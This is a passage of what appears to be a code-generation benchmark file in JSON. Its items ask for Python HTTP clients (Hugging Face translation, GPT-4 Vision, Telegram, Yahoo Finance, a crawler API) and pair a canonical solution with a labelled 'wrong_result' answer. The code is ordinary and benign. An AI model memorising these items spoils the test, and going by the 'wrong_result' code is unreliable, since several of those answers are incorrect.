    "wrong_result": "```python\nimport requests\nimport numpy as np\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.1\"):\n    if \"ada\" in model:\n        return get_openai_embedding(word)\n    else:\n        return get_local_api_embedding(word, model)\n\ndef get_local_api_embedding(word, model):\n    url = f\"http://localhost:8000/embeddings?model={model}\"\n    data = {\"input\": word}\n    try:\n        response = requests.post(url, json=data)\n        response.raise_for_status()\n        embedding = np.array(response.json().get(\"embedding\"))\n        return embedding\n    except requests.exceptions.RequestException as e:\n        print(f\"Error fetching embedding from local API: {e}\")\n        return None\n\ndef get_openai_embedding(word):\n    url = \"https://api.openai.com/v1/embeddings\"\n    headers = {\n        \"Authorization\": \"Bearer YOUR_OPENAI_API_KEY\",\n        \"Content-Type\": \"application/json\"\n    }\n    data = {\n        \"input\": word,\n        \"model\": \"text-embedding-ada-002\"\n    }\n    try:\n        response = requests.post(url, headers=headers, json=data)\n        response.raise_for_status()\n        embedding = np.array(response.json().get(\"data\")[0].get(\"embedding\"))\n        return embedding\n    except requests.exceptions.RequestException as e:\n        print(f\"Error fetching embedding from OpenAI API: {e}\")\n        return None\n```"
  },
  {
    "Task_id": 111,
    "Instruction": "Task Description: Implement a function that translates text using the Hugging Face T5-base model API, handling HTTP requests and responses appropriately.\n\nFunction Description: The function `translate_text` sends a text input to the Hugging Face T5-base model API for translation. It handles the HTTP POST request, checks the response status, and returns either the translated text or an error message. The function uses the `requests` library for HTTP communication and requires an access token for authorization.\n\nInput:\n- `ctx: Context` - The context object for sending responses.\n- `sender: str` - The identifier of the sender to whom the response will be sent.\n- `input_text: str` - The text to be translated.\n\nOutput:\n- The function does not return a value directly but sends a `TranslationResponse` with the translated text if successful, or an `Error` with the error message if the request fails or an exception occurs.",
    "Canonical_solution": "import os\nimport requests\nfrom messages.t5_base import TranslationRequest, TranslationResponse, Error\n\nHUGGING_FACE_ACCESS_TOKEN = os.getenv(\n    \"HUGGING_FACE_ACCESS_TOKEN\", \"HUGGING_FACE_ACCESS_TOKEN\")\nT5_BASE_URL = \"https://api-inference.huggingface.co/models/t5-base\"\nHEADERS = {\n    \"Authorization\": f\"Bearer {HUGGING_FACE_ACCESS_TOKEN}\"\n}\n\nasync def translate_text(ctx: Context, sender: str, input_text: str):\n    payload = {\n        \"inputs\": input_text\n    }\n    try:\n        response = requests.post(T5_BASE_URL, headers=HEADERS, json=payload)\n        if response.status_code == 200:\n            await ctx.send(sender, TranslationResponse(translated_text=f\"{response.json()}\"))\n            return\n        else:\n            await ctx.send(sender, Error(error=f\"Error: {response.json()}\"))\n            return\n    except Exception as ex:\n        await ctx.send(sender, Error(error=f\"Exception Occurred: {ex}\"))\n        return",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom typing import Dict\n\nclass TranslationResponse:\n    def __init__(self, translated_text: str):\n        self.translated_text = translated_text\n\nclass Error:\n    def __init__(self, message: str):\n        self.message = message\n\ndef translate_text(ctx: Context, sender: str, input_text: str):\n    url = \"https://api-inference.huggingface.co/models/t5-base\"\n    headers = {\n        \"Authorization\": f\"Bearer YOUR_ACCESS_TOKEN\"\n    }\n    data = {\n        \"inputs\": input_text,\n        \"options\": {\"use_cache\": False}\n    }\n    \n    try:\n        response = requests.post(url, headers=headers, json=data)\n        response.raise_for_status()\n        result = response.json()\n        translated_text = result[0]['generated_text']\n        ctx.send(sender, TranslationResponse(translated_text))\n    except requests.exceptions.RequestException as e:\n        ctx.send(sender, Error(f\"Request failed: {str(e)}\"))\n    except Exception as e:\n        ctx.send(sender, Error(f\"An error occurred: {str(e)}\"))\n```"
  },
  {
    "Task_id": 112,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the Pulsstory ExternalSyncAPI, handling authentication, data retrieval, and activity synchronization.\n\nClass Description: The PulsstoryHTTPClient class provides methods to interact with the Pulsstory API, including user authentication, activity download/upload, and token management. It handles HTTP requests, error responses, and data serialization.\n\nAttributes:\n- URLBase: str - The base URL for all API endpoints\n- PULSSTORY_CLIENT_ID: str - Client ID for API authentication\n- PULSSTORY_CLIENT_SECRET: str - Client secret for API authentication\n\nMethods:\n- _api_request(endpoint: str, service_record: object = None, method: str = \"POST\", data: dict = None, headers: dict = None, files: dict = None) -> dict - Internal method to make API requests and handle responses\n- _apiData(service_record: object) -> dict - Helper method to prepare authentication data\n- get_user_id(service_record: object) -> str - Retrieves user ID from the API\n- get_api_uris(service_record: object) -> dict - Gets API endpoint URIs from the service\n- retrieve_authorization_token(code: str) -> str - Exchanges an authorization code for an access token\n- revoke_authorization(service_record: object) -> None - Revokes an existing authorization\n- download_activity(service_record: object, activity_id: str) -> dict - Downloads activity data\n- upload_activity(service_record: object, upload_data: dict, uris: dict) -> str - Uploads activity data as a compressed file",
    "Canonical_solution": "from tapiriik.settings import PULSSTORY_CLIENT_ID, PULSSTORY_CLIENT_SECRET\nimport requests\nimport urllib.parse\nimport json\n\nclass PulsstoryHTTPClient:\n    def __init__(self, base_url, client_id=None, client_secret=None):\n        self.URLBase = base_url\n        self.PULSSTORY_CLIENT_ID = client_id or PULSSTORY_CLIENT_ID\n        self.PULSSTORY_CLIENT_SECRET = client_secret or PULSSTORY_CLIENT_SECRET\n\n    def _api_request(self, endpoint, service_record=None, method=\"POST\", data=None, headers=None, files=None):\n        url = self.URLBase + endpoint\n        request_data = self._apiData(service_record) if service_record else {}\n        if data:\n            request_data.update(data)\n        \n        if method == \"POST\":\n            response = requests.post(url, data=request_data, headers=headers, files=files)\n        else:\n            raise ValueError(\"Unsupported HTTP method\")\n\n        if response.status_code != 200:\n            if response.status_code in [401, 403]:\n                raise APIException(\"No authorization for request\", block=True, user_exception=UserException(UserExceptionType.Authorization, intervention_required=True))\n            raise APIException(f\"Request failed with status {response.status_code}: {response.text}\")\n\n        return response.json()\n\n    def _apiData(self, service_record):\n        return {\"access_token\": service_record.Authorization[\"Token\"]}\n\n    def get_user_id(self, service_record):\n        return self._api_request(\"/ExternalSyncAPI/GetUserId\", service_record)[\"userID\"]\n\n    def get_api_uris(self, service_record):\n        uris = self._api_request(\"/ExternalSyncAPI/Uris\", service_record)\n        for k in uris.keys():\n            if isinstance(uris[k], str):\n                uris[k] = self.URLBase + uris[k]\n        return uris\n\n    def retrieve_authorization_token(self, code):\n        params = {\n            \"code\": code,\n            \"client_id\": self.PULSSTORY_CLIENT_ID,\n            \"client_secret\": self.PULSSTORY_CLIENT_SECRET\n        }\n        response = requests.post(\n            self.URLBase + \"/ExternalSyncAPI/GenerateToken\",\n            data=urllib.parse.urlencode(params),\n            headers={\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        )\n        if response.status_code != 200:\n            raise APIException(\"Invalid code\")\n        return response.json()[\"access_token\"]\n\n    def revoke_authorization(self, service_record):\n        response = requests.post(self.URLBase + \"/ExternalSyncAPI/Deauthorize\", data=self._apiData(service_record))\n        if response.status_code not in [200, 204]:\n            raise APIException(f\"Unable to deauthorize token, status {response.status_code}\")\n\n    def download_activity(self, service_record, activity_id):\n        return self._api_request(activity_id, service_record)\n\n    def upload_activity(self, service_record, upload_data, uris):\n        json_data = json.dumps(upload_data)\n        buffer = io.BytesIO()\n        with zipfile.ZipFile(buffer, 'w') as myzip:\n            myzip.writestr('activity.txt', json_data, compress_type=zipfile.ZIP_DEFLATED)\n        files = {\"data\": buffer.getvalue()}\n        return self._api_request(uris[\"upload_activity_zip\"], service_record, files=files)[\"Id\"]",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport json\nimport gzip\nimport io\n\nclass PulsstoryHTTPClient:\n    def __init__(self, URLBase: str, PULSSTORY_CLIENT_ID: str, PULSSTORY_CLIENT_SECRET: str):\n        self.URLBase = URLBase\n        self.PULSSTORY_CLIENT_ID = PULSSTORY_CLIENT_ID\n        self.PULSSTORY_CLIENT_SECRET = PULSSTORY_CLIENT_SECRET\n\n    def _api_request(self, endpoint: str, service_record: object = None, method: str = \"POST\", data: dict = None, headers: dict = None, files: dict = None) -> dict:\n        url = f\"{self.URLBase}{endpoint}\"\n        if headers is None:\n            headers = {}\n        response = requests.request(method, url, data=data, headers=headers, files=files)\n        response.raise_for_status()\n        return response.json()\n\n    def _apiData(self, service_record: object) -> dict:\n        return {\n            \"client_id\": self.PULSSTORY_CLIENT_ID,\n            \"client_secret\": self.PULSSTORY_CLIENT_SECRET,\n            \"service_record\": service_record\n        }\n\n    def get_user_id(self, service_record: object) -> str:\n        auth_data = self._apiData(service_record)\n        response = self._api_request(\"/user/id\", service_record, data=auth_data)\n        return response.get(\"user_id\")\n\n    def get_api_uris(self, service_record: object) -> dict:\n        auth_data = self._apiData(service_record)\n        response = self._api_request(\"/api/uris\", service_record, data=auth_data)\n        return response.get(\"uris\")\n\n    def retrieve_authorization_token(self, code: str) -> str:\n        data = {\n            \"client_id\": self.PULSSTORY_CLIENT_ID,\n            \"client_secret\": self.PULSSTORY_CLIENT_SECRET,\n            \"code\": code\n        }\n        response = self._api_request(\"/token\", data=data)\n        return response.get(\"access_token\")\n\n    def revoke_authorization(self, service_record: object) -> None:\n        auth_data = self._apiData(service_record)\n        self._api_request(\"/revoke\", service_record, data=auth_data)\n\n    def download_activity(self, service_record: object, activity_id: str) -> dict:\n        auth_data = self._apiData(service_record)\n        data = {\"activity_id\": activity_id}\n        response = self._api_request(\"/activity/download\", service_record, data=data)\n        return response\n\n    def upload_activity(self, service_record: object, upload_data: dict, uris: dict) -> str:\n        auth_data = self._apiData(service_record)\n        json_data = json.dumps(upload_data)\n        compressed_data = gzip.compress(json_data.encode('utf-8'))\n        files = {'file': ('activity.json.gz', io.BytesIO(compressed_data))}\n        response = self._api_request(uris[\"upload\"], service_record, method=\"POST\", files=files)\n        return response.get(\"upload_id\")\n```"
  },
  {
    "Task_id": 113,
    "Instruction": "Task Description: Implement a Python class that interacts with OpenAI's GPT-4 Vision API to process image and text prompts, handling image encoding and API communication with retry logic.\n\nClass Description: OpenAIGPT4Vision is a client for OpenAI's GPT-4 Vision API that processes both text and image inputs. It handles image conversion to base64 format, API request construction, and response processing with built-in retry mechanisms for failed requests.\n\nAttributes:\napi_key: str - The OpenAI API key for authentication\nheaders: dict - HTTP headers including Content-Type and Authorization\nmax_new_tokens: int - Maximum number of tokens to generate in the response (default: 256)\n\nMethods:\n__init__(api_key: str, max_new_tokens: int = 256) -> None - Initializes the API client with authentication and configuration\nencode_image_to_base64(raw_image_data: PIL.Image.Image) -> str - Static method that converts PIL Image to base64 encoded string\ngenerate(text_prompt: str, raw_image_data: Union[PIL.Image.Image, dict, str]) -> str - Processes text and image input, calls the API, and returns the generated content\n_get_pil_image(raw_image_data: Union[PIL.Image.Image, dict, str]) -> PIL.Image.Image - Static helper method to convert various image formats to PIL Image object",
    "Canonical_solution": "import requests\nimport base64\nfrom PIL import Image\nimport io\nimport time\n\nclass OpenAIGPT4Vision:\n    def __init__(self, api_key: str, max_new_tokens: int = 256):\n        self.api_key = api_key\n        self.headers = {\"Content-Type\": \"application/json\", \"Authorization\": f\"Bearer {api_key}\"}\n        self.max_new_tokens = max_new_tokens\n\n    @staticmethod\n    def encode_image_to_base64(raw_image_data) -> str:\n        if isinstance(raw_image_data, Image.Image):\n            buffered = io.BytesIO()\n            raw_image_data.save(buffered, format=\"JPEG\")\n            return base64.b64encode(buffered.getvalue()).decode(\"utf-8\")\n        raise ValueError(\"The input image data must be a PIL.Image.Image\")\n\n    def generate(self, text_prompt: str, raw_image_data):\n        raw_image_data = self._get_pil_image(raw_image_data).convert(\"RGB\")\n        base64_image = self.encode_image_to_base64(raw_image_data)\n\n        payload = {\n            \"model\": \"gpt-4-vision-preview\",\n            \"messages\": [\n                {\n                    \"role\": \"user\",\n                    \"content\": [\n                        {\"type\": \"text\", \"text\": text_prompt},\n                        {\"type\": \"image_url\", \"image_url\": {\"url\": f\"data:image/jpeg;base64,{base64_image}\"}},\n                    ],\n                }\n            ],\n            \"max_tokens\": self.max_new_tokens,\n        }\n\n        retry = True\n        retry_times = 0\n        while retry and retry_times < 5:\n            response = requests.post(\"https://api.openai.com/v1/chat/completions\", headers=self.headers, json=payload)\n            if response.status_code == 200:\n                response_data = response.json()\n                return response_data[\"choices\"][0][\"message\"][\"content\"]\n            else:\n                print(f\"Failed to connect to OpenAI API: {response.status_code} - {response.text}. Retrying...\")\n                time.sleep(10)\n                retry_times += 1\n        return \"Failed to connect to OpenAI GPT4V API\"\n\n    @staticmethod\n    def _get_pil_image(raw_image_data) -> Image.Image:\n        if isinstance(raw_image_data, Image.Image):\n            return raw_image_data\n        elif isinstance(raw_image_data, dict) and \"bytes\" in raw_image_data:\n            return Image.open(io.BytesIO(raw_image_data[\"bytes\"]))\n        elif isinstance(raw_image_data, str):\n            image_bytes = base64.b64decode(raw_image_data)\n            return Image.open(io.BytesIO(image_bytes))\n        else:\n            raise ValueError(\"Unsupported image data format\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport base64\nimport json\nimport requests\nfrom PIL import Image\nfrom io import BytesIO\nfrom typing import Union\n\nclass OpenAIGPT4Vision:\n    def __init__(self, api_key: str, max_new_tokens: int = 256) -> None:\n        self.api_key = api_key\n        self.headers = {\n            \"Content-Type\": \"application/json\",\n            \"Authorization\": f\"Bearer {self.api_key}\"\n        }\n        self.max_new_tokens = max_new_tokens\n\n    @staticmethod\n    def encode_image_to_base64(raw_image_data: Image.Image) -> str:\n        buffered = BytesIO()\n        raw_image_data.save(buffered, format=\"JPEG\")\n        img_str = base64.b64encode(buffered.getvalue()).decode(\"utf-8\")\n        return img_str\n\n    def generate(self, text_prompt: str, raw_image_data: Union[Image.Image, dict, str]) -> str:\n        image = self._get_pil_image(raw_image_data)\n        base64_image = self.encode_image_to_base64(image)\n        \n        payload = {\n            \"prompt\": text_prompt,\n            \"image\": base64_image,\n            \"max_new_tokens\": self.max_new_tokens\n        }\n\n        url = \"https://api.openai.com/v1/gpt-4-vision\"\n        for attempt in range(3):\n            try:\n                response = requests.post(url, headers=self.headers, data=json.dumps(payload))\n                response.raise_for_status()\n                return response.json().get(\"generated_content\", \"\")\n            except requests.RequestException as e:\n                print(f\"Request failed: {e}. Retrying...\")\n\n        raise Exception(\"Failed to generate content after multiple retries.\")\n\n    @staticmethod\n    def _get_pil_image(raw_image_data: Union[Image.Image, dict, str]) -> Image.Image:\n        if isinstance(raw_image_data, Image.Image):\n            return raw_image_data\n        elif isinstance(raw_image_data, dict):\n            if \"url\" in raw_image_data:\n                return Image.open(requests.get(raw_image_data[\"url\"]).content)\n            elif \"base64\" in raw_image_data:\n                return Image.open(BytesIO(base64.b64decode(raw_image_data[\"base64\"])))\n        elif isinstance(raw_image_data, str):\n            return Image.open(raw_image_data)\n        raise ValueError(\"Invalid image format\")\n```"
  },
  {
    "Task_id": 114,
    "Instruction": "Task Description: Write a Python function that downloads a schema file from a given URL and returns its local path. The function should handle cases where the file already exists locally and properly manage HTTP request failures.\n\nFunction Description: The function `download_schema_file` downloads a JSON schema file from a specified URL to a local path. It checks if the file already exists locally before attempting to download. If the download fails, it issues a warning and exits the script. The function uses the `requests` library for HTTP operations and handles file paths using `pathlib.Path`.\n\nInput: \n- `envs` (Dict[str, Any]): A dictionary containing environment variables with the following keys:\n  - `SIGMA_SCHEMA_FILE`: Optional local path for the schema file. If not provided, defaults to \"sigma-schema.json\" in the workspace.\n  - `SIGMA_SCHEMA_URL`: URL from which to download the schema file.\n  - `GITHUB_WORKSPACE`: Base directory path for resolving relative file paths.\n\nOutput: \n- `Path | NoReturn`: Returns the absolute path to the downloaded schema file if successful. If the download fails, the function exits the script with status code -1.",
    "Canonical_solution": "import os\nimport requests\nimport warnings\nfrom pathlib import Path\nfrom typing import Any, Dict, NoReturn\n\ndef download_schema_file(envs: Dict[str, Any]) -> Path | NoReturn:\n    \"\"\"Download the schema file from the given URL and return its path.\n\n    Args:\n        envs (Dict[str, Any]): A dictionary containing the environment variables\n            used by the action.\n\n    Returns:\n        Path | NoReturn: Path to the schema file or exit the script if\n            the file could not be downloaded.\n    \"\"\"\n\n    schema_file = envs[\"SIGMA_SCHEMA_FILE\"]\n    schema_url = envs[\"SIGMA_SCHEMA_URL\"]\n    if not schema_file:\n        schema_file = envs[\"GITHUB_WORKSPACE\"] / \"sigma-schema.json\"\n    else:\n        schema_file = Path(schema_file)\n        if not schema_file.exists():\n            schema_file = envs[\"GITHUB_WORKSPACE\"] / schema_file\n\n    if not schema_file.exists():\n        response = requests.get(schema_url)\n        if response.status_code == 200:\n            with open(schema_file, \"wb\") as f:\n                f.write(response.content)\n        else:\n            warnings.warn(\n                f\"Failed to download schema file {schema_file}, skipping validation\"\n            )\n            os._exit(-1)\n    return (envs[\"GITHUB_WORKSPACE\"] / schema_file).absolute()",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nfrom pathlib import Path\nimport requests\nfrom typing import Dict, Any\n\ndef download_schema_file(envs: Dict[str, Any]) -> Path:\n    schema_url = envs.get('SIGMA_SCHEMA_URL')\n    schema_file = envs.get('SIGMA_SCHEMA_FILE', 'sigma-schema.json')\n    workspace = envs.get('GITHUB_WORKSPACE', '.')\n    \n    local_path = Path(workspace) / schema_file\n    \n    if local_path.exists():\n        return local_path.resolve()\n    \n    try:\n        response = requests.get(schema_url)\n        response.raise_for_status()\n        local_path.write_bytes(response.content)\n    except requests.RequestException as e:\n        print(f\"Failed to download schema file from {schema_url}: {e}\")\n        exit(-1)\n    \n    return local_path.resolve()\n```"
  },
  {
    "Task_id": 115,
    "Instruction": "Task Description: Create a Python function that fetches stock data from Yahoo Finance API for a given stock symbol using HTTP requests.\n\nFunction Description: The function should make an HTTP GET request to Yahoo Finance's quote API endpoint, handle potential errors, and return the stock data in a string format. It should validate the response status and structure before returning the data.\n\nInput: \n- symbol (str): The stock symbol to fetch data for (e.g., 'AAPL' for Apple Inc.)\n\nOutput: \n- str: A string representation of the stock data dictionary containing price, volume, and other relevant information from the API response\n\nRaises:\n- ValueError: If the HTTP request fails (non-200 status code) or if no data is found for the given symbol",
    "Canonical_solution": "import requests\n\ndef get_stock_data(symbol: str) -> str:\n    \"\"\"\n    Fetches stock data from Yahoo Finance for a given stock symbol.\n\n    Args:\n        symbol (str): The stock symbol to fetch data for (e.g., 'AAPL' for Apple Inc.).\n\n    Returns:\n        Dict[str, Any]: A dictionary containing stock data, including price, volume, and other relevant information.\n\n    Raises:\n        ValueError: If the stock symbol is invalid or data cannot be retrieved.\n    \"\"\"\n    url = f\"https://query1.finance.yahoo.com/v7/finance/quote?symbols={symbol}\"\n    response = requests.get(url)\n\n    if response.status_code != 200:\n        raise ValueError(f\"Error fetching data for symbol: {symbol}\")\n\n    data = response.json()\n    if (\n        \"quoteResponse\" not in data\n        or not data[\"quoteResponse\"][\"result\"]\n    ):\n        raise ValueError(f\"No data found for symbol: {symbol}\")\n\n    return str(data[\"quoteResponse\"][\"result\"][0])",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\n\ndef fetch_stock_data(symbol):\n    url = f\"https://query1.finance.yahoo.com/v7/finance/quote?symbols={symbol}\"\n    try:\n        response = requests.get(url)\n        response.raise_for_status()  # Raise an error for bad responses\n        data = response.json()\n        if 'quoteResponse' not in data or 'result' not in data['quoteResponse'] or not data['quoteResponse']['result']:\n            raise ValueError(f\"No data found for symbol: {symbol}\")\n        stock_info = data['quoteResponse']['result'][0]\n        return str(stock_info)\n    except requests.RequestException as e:\n        raise ValueError(f\"HTTP request failed: {e}\")\n\n# Example usage:\n# print(fetch_stock_data('AAPL'))\n```"
  },
  {
    "Task_id": 116,
    "Instruction": "Task Description: Create a Python class that interacts with a web API to submit crawling tasks and retrieve their results, supporting both asynchronous and synchronous operations.\n\nClass Description: The Crawl4AiTester class provides functionality to interact with a web API for submitting URL crawling tasks. It handles authentication, task submission, and result retrieval with both asynchronous (polling) and synchronous approaches.\n\nAttributes:\n- base_url: str - The base URL of the API server (default: \"http://localhost:11235\")\n- api_token: str - The authentication token for API access (can be set via environment variable)\n- headers: dict - HTTP headers including the authorization token if provided\n\nMethods:\n- __init__(base_url: str = \"http://localhost:11235\", api_token: str = None) -> None - Initializes the API client with optional base URL and API token\n- submit_and_wait(request_data: Dict[str, Any], timeout: int = 300) -> Dict[str, Any] - Submits an asynchronous crawling task and polls for results until completion or timeout\n- submit_sync(request_data: Dict[str, Any]) -> Dict[str, Any] - Submits a synchronous crawling task and returns the immediate response",
    "Canonical_solution": "import requests\nimport os\nfrom typing import Dict, Any\n\nclass Crawl4AiTester:\n    def __init__(self, base_url: str = \"http://localhost:11235\", api_token: str = None):\n        self.base_url = base_url\n        self.api_token = api_token or os.getenv('CRAWL4AI_API_TOKEN')\n        self.headers = {'Authorization': f'Bearer {self.api_token}'} if self.api_token else {}\n        \n    def submit_and_wait(self, request_data: Dict[str, Any], timeout: int = 300) -> Dict[str, Any]:\n        response = requests.post(f\"{self.base_url}/crawl\", json=request_data, headers=self.headers)\n        if response.status_code == 403:\n            raise Exception(\"API token is invalid or missing\")\n        task_id = response.json()[\"task_id\"]\n        \n        start_time = time.time()\n        while True:\n            if time.time() - start_time > timeout:\n                raise TimeoutError(f\"Task {task_id} did not complete within {timeout} seconds\")\n                \n            result = requests.get(f\"{self.base_url}/task/{task_id}\", headers=self.headers)\n            status = result.json()\n            \n            if status[\"status\"] == \"failed\":\n                raise Exception(f\"Task failed: {status.get('error')}\")\n                \n            if status[\"status\"] == \"completed\":\n                return status\n                \n            time.sleep(2)\n            \n    def submit_sync(self, request_data: Dict[str, Any]) -> Dict[str, Any]:\n        response = requests.post(f\"{self.base_url}/crawl_sync\", json=request_data, headers=self.headers, timeout=60)\n        if response.status_code == 408:\n            raise TimeoutError(\"Task did not complete within server timeout\")\n        response.raise_for_status()\n        return response.json()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport time\nfrom typing import Any, Dict\nimport requests\n\nclass Crawl4AiTester:\n    def __init__(self, base_url: str = \"http://localhost:11235\", api_token: str = None) -> None:\n        self.base_url = base_url\n        self.api_token = api_token or os.getenv(\"CRAWL_API_TOKEN\")\n        self.headers = {\"Authorization\": f\"Bearer {self.api_token}\"} if self.api_token else {}\n\n    def submit_and_wait(self, request_data: Dict[str, Any], timeout: int = 300) -> Dict[str, Any]:\n        response = requests.post(f\"{self.base_url}/submit\", json=request_data, headers=self.headers)\n        response.raise_for_status()\n        task_id = response.json().get(\"task_id\")\n        \n        start_time = time.time()\n        while True:\n            result_response = requests.get(f\"{self.base_url}/results/{task_id}\", headers=self.headers)\n            result_response.raise_for_status()\n            result = result_response.json()\n            if result.get(\"status\") == \"completed\":\n                return result\n            if time.time() - start_time > timeout:\n                raise TimeoutError(\"Task timed out\")\n            time.sleep(5)\n\n    def submit_sync(self, request_data: Dict[str, Any]) -> Dict[str, Any]:\n        response = requests.post(f\"{self.base_url}/submit_sync\", json=request_data, headers=self.headers)\n        response.raise_for_status()\n        return response.json()\n```"
  },
  {
    "Task_id": 117,
    "Instruction": "Task Description: Implement a Python class that serves as a client for interacting with the Telegram Bot API, enabling message and file sending functionality.\n\nClass Description: The TelegramClient class provides methods to send messages and files to a specified Telegram chat using the Telegram Bot API. It handles HTTP requests and responses, including error logging.\n\nAttributes:\n- chat_id: [Union[int, str]] - The unique identifier for the target chat or username of the target channel (in format @channelusername)\n- thread_id: [int] - The unique identifier for the target message thread (topic) in a forum-style chat\n- bot_token: [str] - The authentication token for the Telegram bot\n\nMethods:\n- send_message(message: str, disable_links_preview: bool = True) -> None - Sends a text message to the specified chat. Uses Markdown formatting by default and can disable web page previews.\n  Input:\n    - message: [str] - The text message to be sent\n    - disable_links_preview: [bool] - Whether to disable web page previews for links in the message (default: True)\n  Output: None (logs errors if request fails)\n\n- send_file(file_name: str, contents: bytes) -> None - Sends a file to the specified chat, automatically handling different file types (photos vs documents) and converting SVG to PNG if needed.\n  Input:\n    - file_name: [str] - The name of the file to be sent\n    - contents: [bytes] - The binary content of the file\n  Output: None (logs errors if request fails)",
    "Canonical_solution": "import logging\nimport os\nfrom typing import Union\nimport requests\n\nTELEGRAM_BASE_URL = os.environ.get(\"TELEGRAM_BASE_URL\", \"https://api.telegram.org\")\n\nclass TelegramClient:\n    def __init__(self, chat_id: Union[int, str], thread_id: int, bot_token: str):\n        self.chat_id = int(chat_id)\n        self.thread_id = thread_id\n        self.bot_token = bot_token\n\n    def send_message(self, message: str, disable_links_preview: bool = True):\n        url = f\"{TELEGRAM_BASE_URL}/bot{self.bot_token}/sendMessage\"\n        message_json = {\n            \"chat_id\": self.chat_id,\n            \"message_thread_id\": self.thread_id,\n            \"disable_web_page_preview\": disable_links_preview,\n            \"parse_mode\": \"Markdown\",\n            \"text\": message,\n        }\n        response = requests.post(url, json=message_json)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send telegram message: chat_id - {self.chat_id} reason - {response.reason} {response.text}\"\n            )\n\n    def send_file(self, file_name: str, contents: bytes):\n        file_type = \"Photo\" if is_image(file_name) else \"Document\"\n        url = f\"{TELEGRAM_BASE_URL}/bot{self.bot_token}/send{file_type}?chat_id={self.chat_id}\"\n        if file_name.endswith(SVG_SUFFIX):\n            contents = convert_svg_to_png(contents)\n            file_name = file_name.replace(SVG_SUFFIX, PNG_SUFFIX)\n\n        files = {file_type.lower(): (file_name, contents)}\n        response = requests.post(url, files=files)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send telegram file: chat_id - {self.chat_id} reason - {response.reason} {response.text}\"\n            )",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom typing import Union\nimport io\nimport cairosvg\n\nclass TelegramClient:\n    def __init__(self, chat_id: Union[int, str], thread_id: int, bot_token: str):\n        self.chat_id = chat_id\n        self.thread_id = thread_id\n        self.bot_token = bot_token\n        self.base_url = f\"https://api.telegram.org/bot{self.bot_token}\"\n\n    def send_message(self, message: str, disable_links_preview: bool = True) -> None:\n        url = f\"{self.base_url}/sendMessage\"\n        payload = {\n            \"chat_id\": self.chat_id,\n            \"text\": message,\n            \"parse_mode\": \"Markdown\",\n            \"disable_web_page_preview\": disable_links_preview\n        }\n        try:\n            response = requests.post(url, json=payload)\n            response.raise_for_status()\n        except requests.RequestException as e:\n            print(f\"Error sending message: {e}\")\n\n    def send_file(self, file_name: str, contents: bytes) -> None:\n        url = f\"{self.base_url}/sendDocument\"\n        if file_name.lower().endswith(('.png', '.jpg', '.jpeg')):\n            url = f\"{self.base_url}/sendPhoto\"\n        elif file_name.lower().endswith('.svg'):\n            contents = cairosvg.svg2png(bytestring=contents)\n            file_name = file_name.replace('.svg', '.png')\n\n        files = {'document': (file_name, contents)}\n        payload = {\"chat_id\": self.chat_id}\n        try:\n            response = requests.post(url, data=payload, files=files)\n            response.raise_for_status()\n        except requests.RequestException as e:\n            print(f\"Error sending file: {e}\")\n```"
  },
  {
    "Task_id": 119,
    "Instruction": "Task Description: Create a Python class that serves as a base HTTP client for interacting with a RESTful API, handling various types of API calls (GET, POST, PUT, DELETE) with proper error handling and logging.\n\nClass Description: SXTBaseAPI is a base class that provides HTTP client functionality for making API calls to a specified endpoint. It handles authentication, request construction, response processing, and error handling. The class supports configurable API versions, network call simulation, and comprehensive logging.\n\nAttributes:\n- api_url: str - Base URL for the API endpoint (default: 'https://api.spaceandtime.app')\n- access_token: str - Authentication token for API access\n- logger: logging.Logger - Logger instance for recording API call information\n- network_calls_enabled: bool - Flag to enable/disable actual network calls (default: True)\n- standard_headers: dict - Default headers for API requests\n- versions: dict - Dictionary mapping API endpoints to their versions\n- APICALLTYPE: Enum - Reference to SXTApiCallTypes enum for request types\n\nMethods:\n- __init__(access_token: str = '', logger: logging.Logger = None) -> None - Initializes the API client with optional access token and logger\n- call_api(endpoint: str, auth_header: bool = True, request_type: str = SXTApiCallTypes.POST, header_parms: dict = {}, data_parms: dict = {}, query_parms: dict = {}, path_parms: dict = {}) -> tuple[bool, dict] - Makes an API call with specified parameters and returns success status with response data\n- __fakedata__(endpoint: str) -> Union[list, dict] - Generates mock data when network calls are disabled (for testing purposes)",
    "Canonical_solution": "import requests\nimport json\nimport logging\nfrom pathlib import Path\nfrom .sxtenums import SXTApiCallTypes\nfrom .sxtexceptions import SxTArgumentError, SxTAPINotDefinedError\nfrom .sxtbiscuits import SXTBiscuit\n\nclass SXTBaseAPI:\n    api_url = 'https://api.spaceandtime.app'\n    access_token = ''\n    logger: logging.Logger\n    network_calls_enabled: bool = True\n    standard_headers = {\n        \"accept\": \"application/json\",\n        \"content-type\": \"application/json\"\n    }\n    versions = {}\n    APICALLTYPE = SXTApiCallTypes\n\n    def __init__(self, access_token: str = '', logger: logging.Logger = None) -> None:\n        if logger:\n            self.logger = logger\n        else:\n            self.logger = logging.getLogger()\n            self.logger.setLevel(logging.INFO)\n            if len(self.logger.handlers) == 0:\n                self.logger.addHandler(logging.StreamHandler())\n\n        apiversionfile = Path(Path(__file__).resolve().parent / 'apiversions.json')\n        self.access_token = access_token\n        with open(apiversionfile, 'r') as fh:\n            content = fh.read()\n        self.versions = json.loads(content)\n\n    def call_api(self, endpoint: str,\n                 auth_header: bool = True,\n                 request_type: str = SXTApiCallTypes.POST,\n                 header_parms: dict = {},\n                 data_parms: dict = {},\n                 query_parms: dict = {},\n                 path_parms: dict = {}):\n        txt = 'response.text not available - are you sure you have the correct API Endpoint?'\n        statuscode = 555\n        response = {}\n\n        if not self.network_calls_enabled: return True, self.__fakedata__(endpoint)\n\n        def __handle_errors__(txt, ex, statuscode, responseobject, loggerobject):\n            